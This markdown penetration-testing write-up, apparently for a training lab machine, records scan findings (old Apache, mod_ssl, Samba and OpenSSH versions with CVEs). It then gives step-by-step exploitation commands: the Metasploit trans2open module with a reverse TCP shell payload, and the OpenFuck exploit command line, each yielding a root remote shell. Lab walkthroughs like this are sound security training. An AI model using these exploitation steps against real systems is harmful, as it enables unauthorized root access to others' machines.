# Findings
- 80/443 - `<IP Address>`

- Default Webpage
  - Apache
  - PHP

- Information Disclosure
  - 404 Page
  - Server headers disclose version information

- 80/TCP  open http   Apache httpd 1.3.20 ((Unix) Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)

- mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell.
  - (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082), OSVDB-756

- SMB
  - Unix (Samba 2.2.1a)

- Webalizer Version 2.01
  - (http://`<IP Address>`/usage/usage_201911.html)

- SSH
  - OpenSSH 2.9p2

# Vulnerabilities
- 80/443 - Potentially vulnerable to OpenFuck
  - (https://exploit-db.com/exploits/764)
  - (https://github.com/heltonWernik/OpenLuck)

- 139 - Potentially vulnerable to trans2open
  - (https://rapid7.com/db/modules/exploit/linux/samba/trans2open)
  - (https://exploit-db.com/exploits/7)

# Nessus Results
- OpenSSL Insufficient Patching
- OpenSSH Remote Privilege Elevation
  - Multiple Remote Overflows
- Apache Insufficient Patching

# Exploitation

## Metasploit
1. in metasploit console `search trans2open`
2. `use <linux option>`
   -  ##### We use Linux option, since we know the target is operating on a Linux distribution
3. `options`
4. `set rhosts <IP Address>`
5. `run`

#### --- Execute fails, shell dies repeatedly. Use non-staged payload instead. ---
  
1. run `options` again to get payload options
2. `set payload linux/x86/shell_reverse_tcp`
   - ##### first non-staged payload found 
3. `run`

#### --- Successfully gain root access with remote shell ---

## Manual Exploitation
- Using OpenLuck exploit listed under Vulnerabilities
- Install OpenLuck per instructions in GitHub repo for OpenLuck
  - `./OpenFuck`
    - brings up a "man page"
  - `./OpenFuck target box [port] [-c N]`
    - target &rarr; support offset
    - box &rarr; IP address or hostname
    - -c &rarr; open N connections, 40-50 if unknown
- `./OpenFuck 0x6b <IP Address> -c 40`

#### --- Successfully gain root access with remote shell ---